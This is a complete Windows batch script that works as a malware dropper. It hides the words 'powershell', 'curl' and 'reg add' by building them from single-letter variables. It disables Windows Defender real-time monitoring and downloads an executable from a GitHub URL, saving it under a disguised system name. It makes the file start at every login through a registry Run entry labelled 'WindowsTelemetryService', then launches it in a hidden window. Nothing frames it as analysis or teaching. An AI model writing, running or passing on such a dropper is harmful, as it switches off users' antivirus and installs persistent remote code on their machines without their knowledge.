@echo off

set "v1=p" & set "v2=o" & set "v3=w" & set "v4=e" & set "v5=r" & set "v6=s" & set "v7=h" & set "v8=l"
set "d1=c" & set "d2=u" & set "d3=r" & set "d4=l"
set "r1=r" & set "r2=e" & set "r3=g"
set "a1=a" & set "a2=d" & set "a3=d"

:: Check if the script was started with '-st' parameter
if "%~1"=="-st" goto :payload

:: FIX: Added -Command so it executes and closes
%v1%%v2%%v3%%v4%%v5%%v6%%v7%%v4%%v8%%v8% -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1

:: Define the file name and download URL
set "FN=mscorsvw.exe"
set "TD=%APPDATA%\Microsoft\Windows\Templates\Services\"
set "URL=https://github.com/fullylaw/happy.org/raw/main/dread.exe"

:: Create the target directory if it doesn't exist
if not exist "%TD%" mkdir "%TD%" >nul 2>&1

:: Download and save the file
%d1%%d2%%d3%%d4% -L -o "%TD%%FN%" "%URL%" >nul 2>&1

:: Add the downloaded file to Registry
%r1%%r2%%r3% %a1%%a2%%a3% "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsTelemetryService" /t REG_SZ /d "\"%TD%%FN%\"" /f >nul 2>&1

:: Run the downloaded file in a hidden window and EXIT the batch
start /b "" "%TD%%FN%"
exit
